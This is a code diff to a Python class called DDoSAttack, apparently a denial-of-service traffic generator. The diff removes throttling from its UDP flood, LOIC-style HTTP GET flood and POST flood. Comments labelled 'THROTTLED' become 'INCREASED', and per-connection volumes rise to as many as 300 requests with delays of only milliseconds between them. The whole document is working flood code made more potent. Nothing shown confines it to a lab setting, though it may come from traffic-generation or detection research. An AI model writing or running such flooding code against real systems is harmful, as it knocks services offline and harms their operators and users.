@@ -67,17 +67,24 @@ class DDoSAttack:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.settimeout(1)
                 
-                # VARIATION: Random destination port (creates multiple flows)
+                # INCREASED: Send 50-200 packets per flow (was 1)
+                num_packets = random.randint(50, 200)
                 port = random.choice(udp_ports)
-                payload_size = random.choice(payload_sizes)
-                data = random.randbytes(payload_size) if hasattr(random, 'randbytes') else bytes(random.getrandbits(8) for _ in range(payload_size))
-                sock.sendto(data, (self.target_ip, port))
-                self._inc_count()
+                
+                for _ in range(num_packets):
+                    payload_size = random.choice(payload_sizes)
+                    data = random.randbytes(payload_size) if hasattr(random, 'randbytes') else bytes(random.getrandbits(8) for _ in range(payload_size))
+                    try:
+                        sock.sendto(data, (self.target_ip, port))
+                        self._inc_count()
+                    except Exception:
+                        break
+                    # Minimal delay between packets
+                    time.sleep(random.uniform(0.001, 0.01))
+                
                 sock.close()
             except Exception:
                 pass
-            # THROTTLED: Delay between UDP packets (0.3-0.5 sec for realistic rate)
-            time.sleep(random.uniform(0.3, 0.5))
 
     # ──────────────────────────────────────────────────────
     # LOIC-HTTP — High-volume HTTP GET flood over keep-alive
@@ -101,8 +108,8 @@ class DDoSAttack:
                 attack_port = random.choice(http_ports)
                 sock.connect((self.target_ip, attack_port))
 
-                # THROTTLED: Reduce requests per connection from 20-200 to 1-5
-                for _ in range(random.randint(1, 5)):
+                # INCREASED: 100-300 requests per connection (was 1-5)
+                for _ in range(random.randint(100, 300)):
                     if not self.running or time.time() >= end_time:
                         break
 
@@ -118,13 +125,16 @@ class DDoSAttack:
                     sock.sendall(req.encode())
                     self._inc_count()
 
-                    # Drain response
+                    # Drain response briefly
                     try:
-                        sock.settimeout(0.01)
+                        sock.settimeout(0.005)
                         sock.recv(8192)
                     except socket.timeout:
                         pass
                     sock.settimeout(10)
+                    
+                    # Minimal delay between requests
+                    time.sleep(random.uniform(0.001, 0.005))
 
                 sock.close()
             except Exception:
@@ -161,7 +171,7 @@ class DDoSAttack:
                 sock.connect((self.target_ip, attack_port))
 
                 # Send 1-3 POST requests per connection (VARIATION on timing)
-                requests_this_conn = random.randint(1, 3)
+                requests_this_conn = random.randint(50, 100)
                 for _ in range(requests_this_conn):
                     if not self.running or time.time() >= end_time:
                         break
@@ -190,6 +200,9 @@ class DDoSAttack:
                         sock.recv(8192)
                     except socket.timeout:
                         pass
+                    
+                    # Minimal delay between requests
+                    time.sleep(random.uniform(0.001, 0.005))
 
                 sock.close()
             except Exception:
